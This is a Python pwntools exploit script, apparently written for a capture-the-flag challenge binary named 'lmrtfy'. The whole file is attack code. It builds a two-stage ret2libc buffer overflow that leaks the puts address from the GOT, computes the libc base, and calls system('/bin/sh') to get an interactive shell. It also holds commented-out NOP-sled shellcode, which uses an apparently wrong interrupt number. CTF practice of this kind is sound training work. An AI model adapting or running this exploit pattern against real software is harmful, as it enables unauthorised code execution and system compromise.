from pwn import *

# Set up the binary
context.binary = binary = './lmrtfy'
context.arch = 'i386'
# p = remote('lmrtfy.challs.cyberchallenge.it', 9122)
libc = ELF('/usr/lib32/libc.so.6')  # Adjust based on target
elf = ELF(binary)

p = process(binary)

gdb.attach(p, gdbscript="""
""")

# # Shellcode without forbidden bytes
# shellcode = asm('''
#     mov eax, 0xb       
#     lea ebx, [esp+0x20] 
#     xor ecx, ecx       
#     xor edx, edx       
#     int 0x81           
# ''')
#
# # Pad with NOPs and append "/bin/sh"
# payload = b'\x90' * 200 + shellcode + b'/bin/sh\x00'
#
# # Send payload
# p.sendline(payload)
# p.interactive()

# Gadgets
pop_ebx = 0x08049022  # "pop ebx; ret" (find with `ROPgadget --binary vuln`)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']  # To restart execution after leak

# Stage 1: Leak libc address
payload = b'A' * 264  # Fill buffer (adjust offset)
payload += p32(puts_plt)
payload += p32(main_addr)  # Return to main after leak
payload += p32(puts_got)   # Arg: puts@GOT

p.sendline(payload)

# Parse leaked libc address
leaked_puts = u32(p.recv(4))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")

# Compute libc base & system
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# Stage 2: Call system("/bin/sh")
payload = b'A' * 264
payload += p32(system_addr)
payload += p32(0xdeadbeef)  # Fake return address
payload += p32(binsh_addr)  # Arg: "/bin/sh"

p.sendline(payload)
p.interactive()
